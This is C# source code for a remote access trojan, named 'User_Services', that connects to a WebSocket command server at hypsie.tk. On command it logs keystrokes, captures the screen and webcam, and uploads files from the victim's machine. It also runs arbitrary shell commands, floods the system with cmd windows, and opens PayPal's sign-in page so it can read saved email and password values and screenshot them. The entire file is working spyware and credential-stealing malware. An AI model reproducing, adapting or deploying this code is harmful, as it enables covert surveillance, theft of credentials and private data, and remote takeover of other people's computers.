using System;
using System.Diagnostics;
using WebSocketSharp;
using System.Threading;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Emgu.CV;
using Keystroke.API;
using System.Runtime.InteropServices;

namespace User_Services
{
    class Program
    {
        static string ip = "hypsie.tk";
        static string port = "4422";
        static bool logging = false;
        static bool livelogging = true;
        static bool neverLogged = true;
        static bool neverLiveLogged = true;
        static bool opened = true;
        static bool streaming = false;
        static string dir = Environment.CurrentDirectory;
        static string logged = "";
        static string liveCharacter = "";
        static string lastLiveCharacter = "";
        static string subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
        static Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine;
        static Microsoft.Win32.RegistryKey skey = key.OpenSubKey(subKey);
        static string name = skey.GetValue("ProductName").ToString();

        [DllImport("user32.dll")]
        public static extern int SetForegroundWindow(IntPtr hWnd);

        static void Main(string[] args)
        {

            Thread myThread1;
            myThread1 = new Thread(new ThreadStart(connection));
            myThread1.Start();

        }

        public static string makeId()
        {

            var text = "";
            var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random rnd = new Random();

            for (var i = 0; i < 10; i++)
                text += possible[rnd.Next(0, possible.Length)];

            return text;

        }

        static string myID = makeId();

        public static void connection()
        {

            using (var ws = new WebSocket("ws://" + ip + ":" + port + "?id=" + makeId() + "&infos=" + name))
            {

                ws.OnMessage += (sender, e) =>
                {
                    String message;
                    message = e.Data;
                    if (message.StartsWith("screenshot"))
                    {
                        ws.Send("##MESSAGE##{\"type\":\"info\", \"message\":\"Please wait, generating screenshot...\"}");
                        int x = int.Parse(message.Split(' ')[1]);
                        int y = int.Parse(message.Split(' ')[2]);
                        Bitmap memoryImage;
                        memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                        Screen.PrimaryScreen.Bounds.Height);
                        Size s = new Size(memoryImage.Width, memoryImage.Height);
                        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                        Bitmap bmp = new Bitmap(x, y);
                        Graphics graph = Graphics.FromImage(bmp);
                        graph.DrawImage(memoryImage, 0, 0, x, y);
                        MemoryStream stream = new MemoryStream();
                        bmp.Save(stream, ImageFormat.Bmp);
                        byte[] imageBytes = stream.ToArray();
                        string base64String = Convert.ToBase64String(imageBytes);
                        ws.Send("##SCREENSHOT##" + base64String);
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message == "stream_stop")
                    {
                        streaming = false;
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message.StartsWith("STREAM"))
                    {
                        int x = int.Parse(message.Split(' ')[1]);
                        int y = int.Parse(message.Split(' ')[2]);
                        streaming = true;

                        new Thread(() =>
                        {

                            while (streaming)
                            {
                                Bitmap memoryImage;
                                memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                Screen.PrimaryScreen.Bounds.Height);
                                Size s = new Size(memoryImage.Width, memoryImage.Height);
                                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
                                Bitmap bmp = new Bitmap(x, y);
                                Graphics graph = Graphics.FromImage(bmp);
                                graph.DrawImage(memoryImage, 0, 0, x, y);
                                MemoryStream stream = new MemoryStream();
                                bmp.Save(stream, ImageFormat.Bmp);
                                byte[] imageBytes = stream.ToArray();
                                string base64String = Convert.ToBase64String(imageBytes);
                                ws.Send("##STREAMSHOT##" + base64String);
                                Thread.Sleep(1000);
                            }

                        }).Start();

                    }
                    else if (message.StartsWith("sendkeys"))
                    {
                        var keys = message.Replace("sendkeys ", "");
                        try
                        {
                            SendKeys.SendWait(keys);
                        }
                        catch (Exception error)
                        {
                            ws.Send("##ERROR##" + error.ToString().Replace("\"", ""));
                        }
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message == "CLOSE")
                    {
                        opened = false;
                    }
                    else if (message.StartsWith("CD"))
                    {
                        if (Directory.Exists(message.Split(' ')[1]) || Directory.Exists(dir + message.Split(' ')[1]))
                        {
                            if (message.Split(' ')[1][1] == ':')
                            {
                                dir = message.Split(' ')[1];
                            }
                            else
                            {
                                dir = dir + message.Split(' ')[1];
                            }

                        }
                        else if (Directory.Exists(dir + '/' + message.Split(' ')[1]))
                        {
                            dir = dir + '/' + message.Split(' ')[1];
                        }
                        else
                        {
                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, path does not exist !\"}");
                        }
                        Debug.WriteLine(message.Split(' ')[1]);
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message.StartsWith("ppal"))
                    {
                        Process.Start("chrome.exe", "https://www.paypal.com/fr/signin");
                        Thread.Sleep(1000);
                        var keys = "{F12}";
                        SendKeys.SendWait(keys);
                        Thread.Sleep(1000);
                        var keys1 = "{TAB 24}email.value{ENTER}";
                        SendKeys.SendWait(keys1);
                        Thread.Sleep(500);
                        var keys2 = "password.value{ENTER}";
                        SendKeys.SendWait(keys2);
                        Thread.Sleep(500);
                        Bitmap memoryImage;
                        memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                        Screen.PrimaryScreen.Bounds.Height);
                        Size s = new Size(memoryImage.Width, memoryImage.Height);
                        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
                        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);

                        MemoryStream stream = new MemoryStream();
                        memoryImage.Save(stream, ImageFormat.Bmp);
                        byte[] imageBytes = stream.ToArray();
                        string base64String = Convert.ToBase64String(imageBytes);
                        ws.Send("##SCREENSHOT##" + base64String);
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message == "keylogger live")
                    {
                        livelogging = true;
                        if (neverLiveLogged)
                        {
                            neverLiveLogged = false;
                            new Thread(() =>
                            {
                                using (var api = new KeystrokeAPI())
                                {
                                    api.CreateKeyboardHook((character) =>
                                    {
                                        if (livelogging)
                                        {
                                            ws.Send("##LIVEKEYS##" + character.ToString());
                                        }
                                    });
                                }
                                Application.Run();
                            }).Start();
                        }
                    }
                    else if (message == "keylogger start")
                    {
                        logging = true;
                        livelogging = false;
                        if (neverLogged)
                        {
                            neverLogged = false;
                            new Thread(() =>
                            {
                                using (var api = new KeystrokeAPI())
                                {
                                    api.CreateKeyboardHook((character) =>
                                    {
                                        if (logging)
                                        {
                                            logged += character;
                                        }
                                    });
                                }
                                Application.Run();
                            }).Start();
                        }
                        ws.Send("hello ##" + dir + "##");

                    }
                    else if (message == "keylogger dump")
                    {
                        ws.Send("##LOGGED##" + logged);
                        ws.Send("hello ##" + dir + "##");

                    }
                    else if (message == "keylogger stop")
                    {
                        ws.Send("##LOGGED##" + logged);
                        logging = false;
                        livelogging = false;
                        logged = "";
                        ws.Send("hello ##" + dir + "##");

                    }
                    else if (message == "webcam_snap")
                    {
                        try
                        {
                            VideoCapture capture = new VideoCapture();
                            Bitmap image = capture.QueryFrame().Bitmap;
                            MemoryStream ms = new MemoryStream();
                            image.Save(ms, ImageFormat.Jpeg);
                            byte[] byteImage = ms.ToArray();
                            var SigBase64 = Convert.ToBase64String(byteImage);
                            ws.Send("##WEBCAM_SNAP##" + SigBase64);

                        }
                        catch (Exception error)
                        {
                            ws.Send("##ERROR##" + error.ToString().Replace("\"", ""));
                        }
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message.StartsWith("crash_pc"))
                    {
                        int times = System.Convert.ToInt32(message.Replace("crash_pc ", ""));
                        for (int s = 0; s < times; s++)
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.Start();
                        }
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message == "speedtest")
                    {
                        const string tempfile = "tempfile.tmp";
                        System.Net.WebClient webClient = new System.Net.WebClient();
                        Stopwatch sww = Stopwatch.StartNew();
                        webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
                        sww.Stop();
                        FileInfo fileInfo = new FileInfo(tempfile);
                        long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
                        string jj = "{\"duration\":\"" + sww.Elapsed.Milliseconds + "\",\"file_size\":\"" + fileInfo.Length.ToString("N0") + "\",\"speed\":\"" + speed.ToString("N0") + "\"}";
                        ws.Send("##SPEEDTEST##" + jj);
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message == "SENDHELLO")
                    {
                        ws.Send("hello ##" + dir + "##");
                    }
                    else if (message == "PREFIX")
                    {

                        Process cmd0 = new Process();
                        cmd0.StartInfo.FileName = "cmd.exe";
                        cmd0.StartInfo.RedirectStandardInput = true;
                        cmd0.StartInfo.RedirectStandardOutput = true;
                        cmd0.StartInfo.CreateNoWindow = true;
                        cmd0.StartInfo.UseShellExecute = false;
                        cmd0.Start();

                        cmd0.StandardInput.WriteLine("");
                        cmd0.StandardInput.Flush();
                        cmd0.StandardInput.Close();
                        cmd0.WaitForExit();
                        var blank = cmd0.StandardOutput.ReadToEnd();
                        ws.Send("##PREFIX##" + blank);
                        ws.Send("hello ##" + dir + "##");

                    }
                    else if (message.StartsWith("upload_file"))
                    {
                        string filepath = message.Replace("upload_file ", "");
                        if (System.IO.File.Exists(filepath))
                        {
                            FileInfo info = new FileInfo(filepath);
                            ws.Send("##FILENAME##" + filepath);
                            ws.Send(info);
                            ws.Send("hello ##" + dir + "##");
                        }
                        else if (System.IO.File.Exists(dir + filepath))
                        {
                            FileInfo info = new FileInfo(dir + filepath);
                            ws.Send("##FILENAME##" + dir + filepath);
                            ws.Send(info);
                            ws.Send("hello ##" + dir + "##");
                        }
                        else if (System.IO.File.Exists(dir + '/' + filepath))
                        {
                            FileInfo info = new FileInfo(dir + '/' + filepath);
                            ws.Send("##FILENAME##" + dir + '/' + filepath);
                            ws.Send(info);
                            ws.Send("hello ##" + dir + "##");
                        }
                        else
                        {
                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exist !\"}");
                            ws.Send("hello ##" + dir + "##");
                        }
                    }
                    else
                    {
                        try
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.RedirectStandardInput = true;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.CreateNoWindow = true;
                            cmd.StartInfo.UseShellExecute = false;
                            cmd.Start();

                            cmd.StandardInput.WriteLine("cd " + dir + " & " + message);
                            cmd.StandardInput.Flush();
                            cmd.StandardInput.Close();
                            cmd.WaitForExit();
                            ws.Send(cmd.StandardOutput.ReadToEnd());
                            ws.Send("hello ##" + dir + "##");
                        }
                        catch (Exception error)
                        {

                        }
                    }
                };
                ws.OnClose += (sender, e) => {
                    streaming = false;
                    if (opened)
                    {
                        Stopwatch sw = new Stopwatch();
                        sw.Start();
                        while (true)
                        {
                            if (sw.ElapsedMilliseconds > 2000)
                            {
                                ws.Connect();
                                ws.Send("hello ##" + dir + "##");
                                break;
                            }
                        }
                    }
                };
                if (opened)
                {
                    ws.Connect();
                    ws.Send("hello ##" + dir + "##");
                    new ManualResetEvent(false).WaitOne();
                }

            }

        }

    }
}